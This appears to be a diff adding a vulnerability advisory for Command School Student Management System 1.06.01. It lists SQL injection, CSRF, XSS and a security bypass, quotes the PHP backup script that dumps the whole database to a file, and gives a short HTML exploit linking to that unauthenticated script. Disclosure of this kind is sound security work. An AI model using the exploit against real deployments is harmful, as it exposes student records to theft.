@@ -1,0 +1,82 @@
+source: http://www.securityfocus.com/bid/64707/info
+            
+Command School Student Management System is prone to the following security vulnerabilities:
+            
+1. Multiple SQL-injection vulnerabilities
+2. A cross-site request forgery vulnerability
+3. A cross-site scripting vulnerability
+4. An HTML injection vulnerability
+5. A security-bypass vulnerability
+            
+Exploiting these issues could allow an attacker to run malicious HTML and script codes, steal cookie-based authentication credentials, compromise the application, access or modify data, exploit latent vulnerabilities in the underlying database, or bypass certain security restrictions to perform unauthorized actions.
+            
+Command School Student Management System 1.06.01 is vulnerable; other versions may also be affected. 
+
+
+##############
+VULNERABILITY
+##############
+
+/Backup/backup_ray2.php (LINE: 78-126)
+
+-----------------------------------------------------------------------------
+// SET THE NAME OF THE BACKUP WITH A TIMESTAMP
+$bkup = 'mysql' . date('Ymd\THis') . $db_name . '.txt';
+$fp   = fopen($bkup, "w");
+
+
+// GET THE LIST OF TABLES
+$sql = "SHOW TABLES";
+$res = mysql_query($sql);
+if (!$res) die( mysql_error() );
+if (mysql_num_rows($res) == 0) die( "NO TABLES IN $db_name" );
+while ($s = mysql_fetch_array($res))
+{
+    $tables[] = $s[0];
+}
+
+
+// ITERATE OVER THE LIST OF TABLES
+foreach ($tables as $table)
+{
+
+// WRITE THE DROP TABLE STATEMENT
+    fwrite($fp,"DROP TABLE `$table`;\n");
+
+// GET THE CREATE TABLE STATEMENT
+    $res = mysql_query("SHOW CREATE TABLE `$table`");
+    if (!$res) die( mysql_error() );
+    $cre = mysql_fetch_array($res);
+    $cre[1] .= ";";
+    $txt = str_replace("\n", "", $cre[1]); // FIT EACH QUERY ON ONE LINE
+    fwrite($fp, $txt . "\n");
+
+// GET THE TABLE DATA
+    $data = mysql_query("SELECT * FROM `$table`");
+    $num  = mysql_num_fields($data);
+    while ($row = mysql_fetch_array($data))
+    {
+
+// MAKE INSERT STATEMENTS FOR ALL THE VALUES
+        $txt = "INSERT INTO `$table` VALUES(";
+        for ($i=0; $i < $num; $i++)
+        {
+            $txt .= "'".mysql_real_escape_string($row[$i])."', ";
+        }
+        $txt = substr($txt, 0, -2);
+        fwrite($fp, $txt . ");\n");
+    }
+}
+// ALL DONE
+fclose($fp);
+-----------------------------------------------------------------------------
+
+#####################################################
+EXPLOIT
+#####################################################
+
+<html>
+<title>Iphobos Blog</title>
+<label><a href="http://www.example.com/sw/backup/backup_ray2.php" class="button
+white">Backup Download</a></label>
+</html>
